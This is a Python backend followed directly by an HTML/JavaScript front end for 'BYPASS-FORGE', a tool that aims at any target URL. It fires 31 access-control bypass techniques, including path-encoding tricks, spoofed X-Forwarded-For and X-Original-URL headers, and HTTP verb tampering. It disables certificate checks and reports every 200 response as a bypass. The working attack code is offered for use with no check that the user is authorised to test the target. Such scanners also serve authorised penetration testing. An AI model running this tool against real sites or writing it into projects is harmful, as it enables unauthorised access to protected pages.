#!/usr/bin/env python3
from http.server import HTTPServer, BaseHTTPRequestHandler
import json, urllib.request, urllib.error, threading, time, ssl, os, re, hashlib
from collections import defaultdict
from urllib.parse import urlparse

ssl_ctx = ssl.create_default_context()
ssl_ctx.check_hostname = False
ssl_ctx.verify_mode = ssl.CERT_NONE

ALLOWED_ORIGIN  = "http://127.0.0.1:8080"
RATE_LIMIT_REQ  = 20
RATE_LIMIT_WIN  = 60
MAX_URL_LEN     = 512
CALLSIGN        = os.getenv("FORGE_CALLSIGN", "rayrock92610")
BLOCKED_HOSTS   = {"localhost", "169.254.169.254", "0.0.0.0"}

BYPASS_TECHNIQUES = [
    {"id":"P01","cat":"Path","label":"Trailing Slash","mod":"url","val":"{url}/"},
    {"id":"P02","cat":"Path","label":"Double Slash","mod":"url","val":"{url}//"},
    {"id":"P03","cat":"Path","label":"URL Encoded Slash","mod":"url","val":"{url}/%2F"},
    {"id":"P04","cat":"Path","label":"Dot Segment","mod":"url","val":"{url}/./"},
    {"id":"P05","cat":"Path","label":"Double Dot","mod":"url","val":"{url}/../{path}"},
    {"id":"P06","cat":"Path","label":"Null Byte","mod":"url","val":"{url}/%00"},
    {"id":"P07","cat":"Path","label":"Semicolon","mod":"url","val":"{url};/"},
    {"id":"P08","cat":"Path","label":"Hash Fragment","mod":"url","val":"{url}#"},
    {"id":"P09","cat":"Path","label":"Uppercase Path","mod":"url","val":"UPPER"},
    {"id":"P10","cat":"Path","label":"Double Encode","mod":"url","val":"{url}/%252F"},
    {"id":"H01","cat":"Header","label":"X-Forwarded-For: 127.0.0.1","mod":"header","val":"X-Forwarded-For: 127.0.0.1"},
    {"id":"H02","cat":"Header","label":"X-Forwarded-For: localhost","mod":"header","val":"X-Forwarded-For: localhost"},
    {"id":"H03","cat":"Header","label":"X-Real-IP: 127.0.0.1","mod":"header","val":"X-Real-IP: 127.0.0.1"},
    {"id":"H04","cat":"Header","label":"X-Custom-IP-Authorization","mod":"header","val":"X-Custom-IP-Authorization: 127.0.0.1"},
    {"id":"H05","cat":"Header","label":"X-Originating-IP","mod":"header","val":"X-Originating-IP: 127.0.0.1"},
    {"id":"H06","cat":"Header","label":"X-Remote-IP","mod":"header","val":"X-Remote-IP: 127.0.0.1"},
    {"id":"H07","cat":"Header","label":"X-Client-IP","mod":"header","val":"X-Client-IP: 127.0.0.1"},
    {"id":"H08","cat":"Header","label":"Referer: target","mod":"header","val":"Referer: {url}"},
    {"id":"H09","cat":"Header","label":"X-Original-URL","mod":"header","val":"X-Original-URL: {path}"},
    {"id":"H10","cat":"Header","label":"X-Rewrite-URL","mod":"header","val":"X-Rewrite-URL: {path}"},
    {"id":"H11","cat":"Header","label":"Content-Length: 0","mod":"header","val":"Content-Length: 0"},
    {"id":"H12","cat":"Header","label":"X-Host: 127.0.0.1","mod":"header","val":"X-Host: 127.0.0.1"},
    {"id":"V01","cat":"Verb","label":"POST instead of GET","mod":"verb","val":"POST"},
    {"id":"V02","cat":"Verb","label":"PUT","mod":"verb","val":"PUT"},
    {"id":"V03","cat":"Verb","label":"PATCH","mod":"verb","val":"PATCH"},
    {"id":"V04","cat":"Verb","label":"OPTIONS","mod":"verb","val":"OPTIONS"},
    {"id":"V05","cat":"Verb","label":"HEAD","mod":"verb","val":"HEAD"},
    {"id":"V06","cat":"Verb","label":"TRACE","mod":"verb","val":"TRACE"},
    {"id":"V07","cat":"Verb","label":"CONNECT","mod":"verb","val":"CONNECT"},
    {"id":"V08","cat":"Verb","label":"X-HTTP-Method-Override: GET","mod":"header","val":"X-HTTP-Method-Override: GET"},
    {"id":"V09","cat":"Verb","label":"X-Method-Override: GET","mod":"header","val":"X-Method-Override: GET"},
]

findings      = []
findings_lock = threading.Lock()
rate_table    = defaultdict(list)
rate_lock     = threading.Lock()

def sign_finding(f):
    f["callsign"] = CALLSIGN
    f["sig"] = hashlib.sha256(
        f"{f['ts']}|{f['id']}|{f['url']}|{f['code']}|{CALLSIGN}".encode()
    ).hexdigest()[:16]
    return f

def rate_check(ip):
    now = time.time()
    with rate_lock:
        rate_table[ip] = [t for t in rate_table[ip] if now - t < RATE_LIMIT_WIN]
        if len(rate_table[ip]) >= RATE_LIMIT_REQ:
            return False
        rate_table[ip].append(now)
    return True

def sanitize_url(url):
    if not url or len(url) > MAX_URL_LEN:
        return None, "URL too long or empty"
    url = url.strip()
    if not re.match(r'^https?://', url):
        return None, "Must start with http:// or https://"
    parsed = urlparse(url)
    host = parsed.hostname or ""
    if host in BLOCKED_HOSTS:
        return None, f"Blocked host: {host}"
    if re.match(r'^(10\.|172\.(1[6-9]|2\d|3[01])\.|192\.168\.)', host):
        return None, "Private IP range blocked"
    url = re.sub(r'[\x00-\x1f\x7f]', '', url)
    return url, None

def validate_techniques(ids):
    valid = {t["id"] for t in BYPASS_TECHNIQUES}
    return [i for i in ids if i in valid]

def classify(code):
    if code == 200:               return "BYPASS"
    if code in [301,302,307,308]: return "REDIRECT"
    if code == 401:               return "AUTH"
    if code == 403:               return "BLOCKED"
    if code == 404:               return "NOT_FOUND"
    if code == 500:               return "SERVER_ERR"
    return "OTHER"

def fire_technique(target_url, tech, timeout=8):
    parsed  = urlparse(target_url)
    path    = parsed.path or "/"
    base    = f"{parsed.scheme}://{parsed.netloc}"
    url     = target_url
    headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36",
        "Accept": "*/*",
    }
    method = "GET"
    mod, val = tech["mod"], tech["val"]
    if mod == "url":
        url = base + path.upper() if val == "UPPER" else \
              val.replace("{url}", target_url).replace("{path}", path)
    elif mod == "header":
        k, v = val.split(": ", 1)
        headers[k] = v.replace("{url}", target_url).replace("{path}", path)
    elif mod == "verb":
        method = val
    try:
        req = urllib.request.Request(url, headers=headers, method=method)
        res = urllib.request.urlopen(req, timeout=timeout, context=ssl_ctx)
        code   = res.status
        length = len(res.read())
    except urllib.error.HTTPError as e:
        code   = e.code
        length = 0
    except Exception:
        code   = 0
        length = 0
    result = sign_finding({
        "ts": time.strftime("%Y-%m-%d %H:%M:%S"),
        "id": tech["id"], "cat": tech["cat"],
        "label": tech["label"], "url": url,
        "method": method, "code": code,
        "verdict": classify(code), "bytes": length,
    })
    with findings_lock:
        findings.append(result)
    return result

class ForgeHandler(BaseHTTPRequestHandler):
    def log_message(self, *a): pass
    def _ip(self): return self.client_address[0]
    def _cors(self):
        self.send_header("Access-Control-Allow-Origin", ALLOWED_ORIGIN)
        self.send_header("Access-Control-Allow-Methods", "POST, GET, OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "Content-Type")
        self.send_header("X-Content-Type-Options", "nosniff")
        self.send_header("X-Frame-Options", "DENY")
    def _json(self, data, code=200):
        body = json.dumps(data).encode()
        self.send_response(code)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", len(body))
        self._cors()
        self.end_headers()
        self.wfile.write(body)
    def _rate_gate(self):
        if not rate_check(self._ip()):
            self._json({"error": "Rate limit exceeded"}, 429)
            return False
        return True
    def do_OPTIONS(self):
        origin = self.headers.get("Origin", "")
        if origin != ALLOWED_ORIGIN:
            self.send_response(403); self.end_headers(); return
        self.send_response(200)
        self._cors()
        self.end_headers()
    def do_GET(self):
        if not self._rate_gate(): return
        if self.path == "/techniques":
            self._json(BYPASS_TECHNIQUES)
        elif self.path == "/findings":
            with findings_lock: self._json(findings)
        elif self.path == "/findings/export":
            with findings_lock: data = json.dumps(findings, indent=2)
            ts = time.strftime("%Y%m%d_%H%M%S")
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.send_header("Content-Disposition",
                f"attachment; filename=forge_{CALLSIGN}_{ts}.json")
            self._cors(); self.end_headers()
            self.wfile.write(data.encode())
        elif self.path == "/health":
            self._json({"status":"ok","callsign":CALLSIGN,
                        "techniques":len(BYPASS_TECHNIQUES)})
        else:
            self.send_response(404); self.end_headers()
    def do_POST(self):
        if not self._rate_gate(): return
        origin = self.headers.get("Origin", "")
        if origin != ALLOWED_ORIGIN:
            self._json({"error": "Forbidden"}, 403); return
        if self.path == "/fire":
            length = int(self.headers.get("Content-Length", 0))
            try: body = json.loads(self.rfile.read(length))
            except: self._json({"error": "Invalid JSON"}, 400); return
            raw_url = body.get("url", "")
            url, err = sanitize_url(raw_url)
            if err: self._json({"error": err}, 400); return
            raw_ids  = body.get("techniques", [t["id"] for t in BYPASS_TECHNIQUES])
            safe_ids = validate_techniques(raw_ids)
            if not safe_ids: self._json({"error": "No valid techniques"}, 400); return
            techs = [t for t in BYPASS_TECHNIQUES if t["id"] in safe_ids]
            def run():
                for tech in techs: fire_technique(url, tech)
            threading.Thread(target=run, daemon=True).start()
            self._json({"status":"firing","count":len(techs),"callsign":CALLSIGN})
        elif self.path == "/findings/clear":
            with findings_lock: findings.clear()
            self._json({"status": "cleared"})
        else:
            self.send_response(404); self.end_headers()

if __name__ == "__main__":
    server = HTTPServer(("127.0.0.1", 7443), ForgeHandler)
    print(f"[BYPASS-FORGE] v3 | callsign={CALLSIGN}")
    print(f"[BYPASS-FORGE] http://127.0.0.1:7443")
    print(f"[BYPASS-FORGE] {len(BYPASS_TECHNIQUES)} techniques loaded")
    server.serve_forever()<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
<title>BYPASS-FORGE</title>
<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Rajdhani:wght@400;600;700&display=swap" rel="stylesheet">
<style>
:root {
  --bg:       #050507;
  --surface:  #0c0c12;
  --card:     #111118;
  --border:   #1e1e2e;
  --border2:  #2a2a3e;
  --red:      #e63946;
  --red-dim:  #7a1a20;
  --green:    #00f57a;
  --green-dim:#004a25;
  --amber:    #f4a261;
  --amber-dim:#5a3010;
  --blue:     #48cae4;
  --blue-dim: #0a3a45;
  --muted:    #4a4a6a;
  --dim:      #2a2a3a;
  --text:     #d8d4f0;
  --text2:    #7a7595;
  --mono:     'Share Tech Mono', monospace;
  --sans:     'Rajdhani', sans-serif;
}
* { margin:0; padding:0; box-sizing:border-box; -webkit-tap-highlight-color:transparent; }
html, body {
  background: var(--bg);
  color: var(--text);
  font-family: var(--mono);
  font-size: 13px;
  min-height: 100vh;
  overflow-x: hidden;
}
body::before {
  content:'';
  position:fixed;
  inset:0;
  background: repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,0,0,0.08) 2px,rgba(0,0,0,0.08) 4px);
  pointer-events:none;
  z-index:9999;
}
.header {
  position:sticky; top:0; z-index:100;
  background:var(--surface);
  border-bottom:1px solid var(--border);
  padding:12px 16px;
  display:flex; align-items:center; justify-content:space-between;
}
.logo { font-family:var(--sans); font-size:20px; font-weight:700; letter-spacing:0.1em; text-transform:uppercase; }
.logo span { color:var(--red); text-shadow:0 0 16px var(--red); }
.header-status { display:flex; align-items:center; gap:6px; font-size:10px; color:var(--text2); }
.status-dot { width:6px; height:6px; border-radius:50%; background:var(--green); box-shadow:0 0 8px var(--green); animation:pulse 2s infinite; }
@keyframes pulse { 0%,100%{opacity:1} 50%{opacity:0.3} }
.app { padding:12px 14px 100px; max-width:600px; margin:0 auto; }
.panel { background:var(--card); border:1px solid var(--border); margin-bottom:12px; }
.panel-header { display:flex; align-items:center; gap:8px; padding:10px 14px; border-bottom:1px solid var(--border); font-family:var(--sans); font-size:12px; font-weight:600; letter-spacing:0.15em; text-transform:uppercase; color:var(--text2); }
.panel-header .ph-icon { color:var(--red); font-size:14px; }
.panel-body { padding:14px; }
.input-group { margin-bottom:10px; }
.input-label { font-size:9px; letter-spacing:0.2em; text-transform:uppercase; color:var(--text2); margin-bottom:6px; display:block; }
.url-input { width:100%; background:var(--surface); border:1px solid var(--border2); color:var(--text); font-family:var(--mono); font-size:13px; padding:10px 12px; outline:none; transition:border-color 0.2s; -webkit-appearance:none; }
.url-input:focus { border-color:var(--red); box-shadow:0 0 12px rgba(230,57,70,0.15); }
.url-input::placeholder { color:var(--muted); }
.tech-matrix { display:grid; grid-template-columns:1fr 1fr 1fr; gap:1px; background:var(--border); margin-bottom:10px; }
.cat-block { background:var(--card); padding:10px; }
.cat-title { font-size:9px; letter-spacing:0.2em; text-transform:uppercase; margin-bottom:8px; display:flex; align-items:center; justify-content:space-between; }
.cat-title.path { color:var(--blue); }
.cat-title.header { color:var(--amber); }
.cat-title.verb { color:var(--green); }
.cat-count { font-size:18px; font-family:var(--sans); font-weight:700; opacity:0.3; }
.tech-list { display:flex; flex-direction:column; gap:4px; }
.tech-item { display:flex; align-items:center; gap:6px; font-size:10px; color:var(--text2); cursor:pointer; padding:3px 0; transition:color 0.15s; user-select:none; }
.tech-item:active { opacity:0.6; }
.tech-check { width:12px; height:12px; border:1px solid var(--border2); flex-shrink:0; display:flex; align-items:center; justify-content:center; font-size:8px; transition:all 0.15s; }
.tech-item.selected .tech-check { background:var(--red); border-color:var(--red); color:white; box-shadow:0 0 6px var(--red); }
.tech-item.selected { color:var(--text); }
.tech-id { font-size:8px; color:var(--muted); flex-shrink:0; width:24px; }
.select-row { display:flex; gap:8px; margin-bottom:12px; }
.sel-btn { flex:1; background:var(--surface); border:1px solid var(--border2); color:var(--text2); font-family:var(--mono); font-size:10px; padding:7px; letter-spacing:0.1em; cursor:pointer; transition:all 0.15s; text-align:center; }
.sel-btn:active { background:var(--dim); }
.fire-btn { width:100%; background:var(--red); border:none; color:white; font-family:var(--sans); font-size:16px; font-weight:700; letter-spacing:0.2em; text-transform:uppercase; padding:14px; cursor:pointer; transition:all 0.2s; display:flex; align-items:center; justify-content:center; gap:10px; position:relative; overflow:hidden; }
.fire-btn:active { background:#b02030; transform:scale(0.98); }
.fire-btn.firing { background:var(--red-dim); pointer-events:none; }
.fire-btn::after { content:''; position:absolute; inset:0; background:linear-gradient(90deg,transparent 0%,rgba(255,255,255,0.1) 50%,transparent 100%); transform:translateX(-100%); }
.fire-btn.firing::after { animation:sweep 1.5s linear infinite; }
@keyframes sweep { 0%{transform:translateX(-100%)} 100%{transform:translateX(100%)} }
.progress-wrap { display:none; margin-top:10px; }
.progress-wrap.active { display:block; }
.progress-bar { height:2px; background:var(--border); position:relative; overflow:hidden; }
.progress-fill { height:100%; background:var(--red); width:0%; transition:width 0.3s; box-shadow:0 0 8px var(--red); }
.progress-label { font-size:10px; color:var(--text2); margin-top:6px; display:flex; justify-content:space-between; }
.console { background:#030305; border:1px solid var(--border); font-family:var(--mono); font-size:11px; height:180px; overflow-y:auto; padding:10px; margin-bottom:12px; }
.console::-webkit-scrollbar { width:3px; }
.console::-webkit-scrollbar-thumb { background:var(--dim); }
.log-line { line-height:1.7; display:flex; gap:8px; border-bottom:1px solid rgba(255,255,255,0.02); padding:2px 0; }
.log-ts { color:var(--muted); flex-shrink:0; font-size:10px; }
.log-id { color:var(--text2); flex-shrink:0; width:28px; }
.log-label { color:var(--text); flex:1; }
.log-code { flex-shrink:0; font-weight:bold; }
.code-bypass { color:var(--green); text-shadow:0 0 8px var(--green); }
.code-blocked { color:var(--red); }
.code-redirect { color:var(--amber); }
.code-other,.code-err { color:var(--muted); }
.log-verdict { flex-shrink:0; font-size:9px; padding:1px 5px; }
.verdict-BYPASS { background:var(--green-dim); color:var(--green); }
.verdict-BLOCKED { background:var(--red-dim); color:var(--red); }
.verdict-REDIRECT { background:var(--amber-dim); color:var(--amber); }
.verdict-OTHER,.verdict-AUTH,.verdict-NOT_FOUND,.verdict-SERVER_ERR { background:var(--dim); color:var(--muted); }
.findings-header { display:flex; align-items:center; justify-content:space-between; margin-bottom:8px; }
.findings-count { font-size:10px; color:var(--text2); }
.findings-count span { color:var(--green); font-family:var(--sans); font-size:14px; font-weight:700; }
.action-row { display:flex; gap:6px; }
.act-btn { background:var(--surface); border:1px solid var(--border2); color:var(--text2); font-family:var(--mono); font-size:9px; padding:6px 10px; letter-spacing:0.1em; text-transform:uppercase; cursor:pointer; transition:all 0.15s; }
.act-btn:active { border-color:var(--red); color:var(--red); }
.findings-table { width:100%; border-collapse:collapse; font-size:11px; }
.findings-table th { background:var(--surface); border:1px solid var(--border); padding:6px 8px; text-align:left; font-size:9px; letter-spacing:0.15em; text-transform:uppercase; color:var(--text2); font-weight:normal; }
.findings-table td { border:1px solid var(--border); padding:6px 8px; vertical-align:top; color:var(--text2); font-size:10px; max-width:120px; overflow:hidden; text-overflow:ellipsis; white-space:nowrap; }
.findings-table tr:hover td { background:rgba(255,255,255,0.02); }
.findings-table tr.bypass-row td { background:rgba(0,245,122,0.04); }
.findings-table tr.bypass-row td:first-child { border-left:2px solid var(--green); }
.empty-state { text-align:center; padding:30px; color:var(--muted); font-size:11px; letter-spacing:0.1em; }
.summary-row { display:grid; grid-template-columns:repeat(4,1fr); gap:6px; margin-bottom:12px; }
.stat-card { background:var(--card); border:1px solid var(--border); padding:10px 8px; text-align:center; }
.stat-num { font-family:var(--sans); font-size:24px; font-weight:700; line-height:1; margin-bottom:4px; }
.stat-label { font-size:8px; letter-spacing:0.15em; text-transform:uppercase; color:var(--text2); }
.stat-bypass .stat-num { color:var(--green); text-shadow:0 0 12px var(--green); }
.stat-blocked .stat-num { color:var(--red); }
.stat-redirect .stat-num { color:var(--amber); }
.stat-total .stat-num { color:var(--text); }
.bottom-nav { position:fixed; bottom:0; left:0; right:0; background:var(--surface); border-top:1px solid var(--border); display:flex; z-index:100; }
.nav-tab { flex:1; padding:12px 8px; text-align:center; cursor:pointer; transition:all 0.15s; border-top:2px solid transparent; }
.nav-tab.active { border-top-color:var(--red); }
.nav-tab-icon { font-size:16px; margin-bottom:2px; }
.nav-tab-label { font-size:8px; letter-spacing:0.1em; text-transform:uppercase; color:var(--text2); }
.nav-tab.active .nav-tab-label { color:var(--red); }
.view { display:none; }
.view.active { display:block; }
@keyframes flashGreen { 0%{box-shadow:0 0 0 rgba(0,245,122,0)} 50%{box-shadow:0 0 20px rgba(0,245,122,0.3)} 100%{box-shadow:0 0 0 rgba(0,245,122,0)} }
.bypass-flash { animation:flashGreen 0.5s ease; }
</style>
</head><body>
<div class="header">
  <div class="logo"><span>BYPASS</span>-FORGE</div>
  <div class="header-status">
    <div class="status-dot" id="serverDot"></div>
    <span id="serverLabel">CONNECTING</span>
  </div>
</div>

<div class="app">

  <div class="view active" id="view-forge">
    <div class="panel">
      <div class="panel-header"><span class="ph-icon">⌖</span> Target</div>
      <div class="panel-body">
        <div class="input-group">
          <label class="input-label">Target URL</label>
          <input class="url-input" id="targetUrl" type="url"
            placeholder="https://target.com/admin"
            autocomplete="off" autocorrect="off" autocapitalize="none" spellcheck="false">
        </div>
      </div>
    </div>

    <div class="panel">
      <div class="panel-header"><span class="ph-icon">◈</span> Technique Matrix</div>
      <div class="panel-body" style="padding:10px;">
        <div class="select-row">
          <div class="sel-btn" onclick="selectAll()">SELECT ALL</div>
          <div class="sel-btn" onclick="selectNone()">CLEAR</div>
          <div class="sel-btn" onclick="selectCat('Path')">PATH ONLY</div>
          <div class="sel-btn" onclick="selectCat('Header')">HDR ONLY</div>
        </div>
        <div class="tech-matrix" id="techMatrix"></div>
      </div>
    </div>

    <div class="progress-wrap" id="progressWrap">
      <div class="progress-bar">
        <div class="progress-fill" id="progressFill"></div>
      </div>
      <div class="progress-label">
        <span id="progressText">Firing...</span>
        <span id="progressCount">0 / 0</span>
      </div>
    </div>

    <button class="fire-btn" id="fireBtn" onclick="fire()">
      <span id="fireBtnIcon">⚡</span>
      <span id="fireBtnLabel">FIRE ALL BYPASSES</span>
    </button>
  </div>

  <div class="view" id="view-console">
    <div class="panel-header" style="padding:10px 14px; background:var(--card); border:1px solid var(--border); margin-bottom:8px;">
      <span class="ph-icon" style="color:var(--green);">▶</span>&nbsp; Live Console
    </div>
    <div class="console" id="console">
      <div class="empty-state">Awaiting fire command...</div>
    </div>
  </div>

  <div class="view" id="view-findings">
    <div class="summary-row">
      <div class="stat-card stat-bypass">
        <div class="stat-num" id="statBypass">0</div>
        <div class="stat-label">Bypass</div>
      </div>
      <div class="stat-card stat-redirect">
        <div class="stat-num" id="statRedirect">0</div>
        <div class="stat-label">Redirect</div>
      </div>
      <div class="stat-card stat-blocked">
        <div class="stat-num" id="statBlocked">0</div>
        <div class="stat-label">Blocked</div>
      </div>
      <div class="stat-card stat-total">
        <div class="stat-num" id="statTotal">0</div>
        <div class="stat-label">Total</div>
      </div>
    </div>

    <div class="findings-header">
      <div class="findings-count">
        <span id="bypassCount">0</span> potential bypasses found
      </div>
      <div class="action-row">
        <div class="act-btn" onclick="exportFindings()">EXPORT</div>
        <div class="act-btn" onclick="clearFindings()">CLEAR</div>
      </div>
    </div>

    <div style="overflow-x:auto;">
      <table class="findings-table">
        <thead>
          <tr>
            <th>ID</th>
            <th>Technique</th>
            <th>Code</th>
            <th>Verdict</th>
            <th>Bytes</th>
            <th>Time</th>
          </tr>
        </thead>
        <tbody id="findingsBody">
          <tr><td colspan="6" class="empty-state">No findings yet</td></tr>
        </tbody>
      </table>
    </div>
  </div>

</div>

<div class="bottom-nav">
  <div class="nav-tab active" onclick="switchView('forge', this)">
    <div class="nav-tab-icon">⚡</div>
    <div class="nav-tab-label">Forge</div>
  </div>
  <div class="nav-tab" onclick="switchView('console', this)">
    <div class="nav-tab-icon">▶</div>
    <div class="nav-tab-label">Console</div>
  </div>
  <div class="nav-tab" onclick="switchView('findings', this)">
    <div class="nav-tab-icon">◈</div>
    <div class="nav-tab-label">Findings</div>
  </div>
</div><script>
const API = 'http://127.0.0.1:7443';
let techniques = [];
let selected = new Set();
let polling = null;
let firingTotal = 0;

async function checkServer() {
  try {
    const r = await fetch(API + '/techniques');
    if (r.ok) {
      techniques = await r.json();
      document.getElementById('serverDot').style.background = 'var(--green)';
      document.getElementById('serverDot').style.boxShadow = '0 0 8px var(--green)';
      document.getElementById('serverLabel').textContent = 'ONLINE';
      renderMatrix();
      selectAll();
    }
  } catch(e) {
    document.getElementById('serverDot').style.background = 'var(--red)';
    document.getElementById('serverDot').style.boxShadow = '0 0 8px var(--red)';
    document.getElementById('serverLabel').textContent = 'OFFLINE';
    setTimeout(checkServer, 3000);
  }
}

function renderMatrix() {
  const cats = ['Path', 'Header', 'Verb'];
  const colors = { Path:'blue', Header:'amber', Verb:'green' };
  const matrix = document.getElementById('techMatrix');
  matrix.innerHTML = '';
  cats.forEach(cat => {
    const techs = techniques.filter(t => t.cat === cat);
    const block = document.createElement('div');
    block.className = 'cat-block';
    block.innerHTML = `
      <div class="cat-title ${colors[cat].toLowerCase()}">
        ${cat.toUpperCase()}
        <span class="cat-count">${techs.length}</span>
      </div>
      <div class="tech-list" id="list-${cat}">
        ${techs.map(t => `
          <div class="tech-item selected" id="tech-${t.id}" onclick="toggleTech('${t.id}')">
            <div class="tech-check">✓</div>
            <span class="tech-id">${t.id}</span>
            <span style="overflow:hidden;text-overflow:ellipsis;white-space:nowrap;">${t.label}</span>
          </div>
        `).join('')}
      </div>
    `;
    matrix.appendChild(block);
  });
}

function toggleTech(id) {
  const el = document.getElementById('tech-' + id);
  if (selected.has(id)) {
    selected.delete(id);
    el.classList.remove('selected');
  } else {
    selected.add(id);
    el.classList.add('selected');
  }
  updateFireBtn();
}

function selectAll() {
  techniques.forEach(t => {
    selected.add(t.id);
    const el = document.getElementById('tech-' + t.id);
    if (el) el.classList.add('selected');
  });
  updateFireBtn();
}

function selectNone() {
  selected.clear();
  techniques.forEach(t => {
    const el = document.getElementById('tech-' + t.id);
    if (el) el.classList.remove('selected');
  });
  updateFireBtn();
}

function selectCat(cat) {
  selectNone();
  techniques.filter(t => t.cat === cat).forEach(t => {
    selected.add(t.id);
    const el = document.getElementById('tech-' + t.id);
    if (el) el.classList.add('selected');
  });
  updateFireBtn();
}

function updateFireBtn() {
  document.getElementById('fireBtnLabel').textContent =
    `FIRE ${selected.size} BYPASS${selected.size !== 1 ? 'ES' : ''}`;
}

async function fire() {
  const url = document.getElementById('targetUrl').value.trim();
  if (!url) {
    document.getElementById('targetUrl').style.borderColor = 'var(--red)';
    setTimeout(() => document.getElementById('targetUrl').style.borderColor = '', 1000);
    return;
  }
  if (selected.size === 0) return;

  document.getElementById('console').innerHTML = '';
  await clearFindings();

  const btn = document.getElementById('fireBtn');
  btn.classList.add('firing');
  document.getElementById('fireBtnLabel').textContent = 'FIRING...';

  firingTotal = selected.size;
  document.getElementById('progressWrap').classList.add('active');
  document.getElementById('progressFill').style.width = '0%';
  document.getElementById('progressCount').textContent = `0 / ${firingTotal}`;

  switchView('console', document.querySelectorAll('.nav-tab')[1]);

  try {
    await fetch(API + '/fire', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ url, techniques: [...selected] })
    });
    startPolling();
  } catch(e) {
    logLine({ ts:'', id:'---', label:'CONNECTION FAILED — backend running?', code:0, verdict:'OTHER', bytes:0 });
    resetFireBtn();
  }
}

function startPolling() {
  let lastCount = 0;
  polling = setInterval(async () => {
    try {
      const r = await fetch(API + '/findings');
      const data = await r.json();
      const newEntries = data.slice(lastCount);
      newEntries.forEach(f => logLine(f));
      lastCount = data.length;
      const pct = Math.min((data.length / firingTotal) * 100, 100);
      document.getElementById('progressFill').style.width = pct + '%';
      document.getElementById('progressCount').textContent = `${data.length} / ${firingTotal}`;
      document.getElementById('progressText').textContent =
        data.length < firingTotal ? 'Firing...' : 'Complete';
      updateStats(data);
      if (data.length >= firingTotal) {
        clearInterval(polling);
        resetFireBtn();
        updateFindings(data);
      }
    } catch(e) {}
  }, 400);
}

function logLine(f) {
  const con = document.getElementById('console');
  const empty = con.querySelector('.empty-state');
  if (empty) empty.remove();
  const codeClass = f.verdict === 'BYPASS' ? 'code-bypass'
    : f.verdict === 'BLOCKED' ? 'code-blocked'
    : f.verdict === 'REDIRECT' ? 'code-redirect'
    : f.code === 0 ? 'code-err' : 'code-other';
  const div = document.createElement('div');
  div.className = 'log-line';
  if (f.verdict === 'BYPASS') div.classList.add('bypass-flash');
  div.innerHTML = `
    <span class="log-ts">${f.ts ? f.ts.split(' ')[1] : '--:--:--'}</span>
    <span class="log-id">${f.id}</span>
    <span class="log-label">${f.label}</span>
    <span class="log-code ${codeClass}">${f.code || 'ERR'}</span>
    <span class="log-verdict verdict-${f.verdict}">${f.verdict}</span>
  `;
  con.appendChild(div);
  con.scrollTop = con.scrollHeight;
}

function updateStats(data) {
  document.getElementById('statBypass').textContent   = data.filter(d => d.verdict === 'BYPASS').length;
  document.getElementById('statRedirect').textContent = data.filter(d => d.verdict === 'REDIRECT').length;
  document.getElementById('statBlocked').textContent  = data.filter(d => d.verdict === 'BLOCKED').length;
  document.getElementById('statTotal').textContent    = data.length;
  document.getElementById('bypassCount').textContent  = data.filter(d => d.verdict === 'BYPASS').length;
}

function updateFindings(data) {
  const body = document.getElementById('findingsBody');
  if (!data.length) {
    body.innerHTML = '<tr><td colspan="6" class="empty-state">No findings yet</td></tr>';
    return;
  }
  const sorted = [...data].sort((a,b) => {
    const o = { BYPASS:0, REDIRECT:1, AUTH:2, BLOCKED:3, OTHER:4 };
    return (o[a.verdict]||5) - (o[b.verdict]||5);
  });
  body.innerHTML = sorted.map(f => `
    <tr class="${f.verdict === 'BYPASS' ? 'bypass-row' : ''}">
      <td>${f.id}</td>
      <td title="${f.label}">${f.label.substring(0,20)}${f.label.length>20?'…':''}</td>
      <td class="${f.verdict==='BYPASS'?'code-bypass':f.verdict==='REDIRECT'?'code-redirect':'code-blocked'}">${f.code||'ERR'}</td>
      <td><span class="log-verdict verdict-${f.verdict}">${f.verdict}</span></td>
      <td>${f.bytes}</td>
      <td>${f.ts ? f.ts.split(' ')[1] : '-'}</td>
    </tr>
  `).join('');
}

function resetFireBtn() {
  document.getElementById('fireBtn').classList.remove('firing');
  updateFireBtn();
}

async function clearFindings() {
  try {
    await fetch(API + '/findings/clear', { method: 'POST' });
    document.getElementById('findingsBody').innerHTML =
      '<tr><td colspan="6" class="empty-state">No findings yet</td></tr>';
    updateStats([]);
  } catch(e) {}
}

async function exportFindings() {
  try {
    const r = await fetch(API + '/findings/export');
    const blob = await r.blob();
    const a = document.createElement('a');
    a.href = URL.createObjectURL(blob);
    a.download = `bypass_findings_${Date.now()}.json`;
    a.click();
  } catch(e) { alert('Export failed — check backend'); }
}

function switchView(name, tab) {
  document.querySelectorAll('.view').forEach(v => v.classList.remove('active'));
  document.querySelectorAll('.nav-tab').forEach(t => t.classList.remove('active'));
  document.getElementById('view-' + name).classList.add('active');
  tab.classList.add('active');
  if (name === 'findings') {
    fetch(API + '/findings').then(r => r.json()).then(updateFindings).catch(()=>{});
  }
}

checkServer();
</script>
</body>
</html>
